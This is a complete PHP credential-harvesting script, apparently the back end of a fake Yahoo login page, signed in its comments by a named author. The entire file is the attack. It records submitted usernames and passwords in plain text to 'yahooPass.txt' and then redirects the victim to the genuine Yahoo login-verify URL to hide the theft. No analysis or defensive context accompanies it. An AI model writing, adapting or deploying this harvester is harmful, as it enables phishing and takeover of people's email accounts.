<?PHP
//////////////////////////////////
//CODED BY MALIK TANVEER/////////
////////////////////////////////
//TANVEERHUSSAIN151@YAHOO.COM//
//////////////////////////////
$myFile = "yahooPass.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$username=$_POST['username'];
$password=$_POST['passwd'];
$stringData = "USERNAME:".$username."||PASSWORD:".$password." \n";
fwrite($fh, $stringData);
fclose($fh);
$data['response']="success";
$data['url']="https://login.yahoo.com/config/login_verify2?&.src=ym";
echo json_encode($data);
?>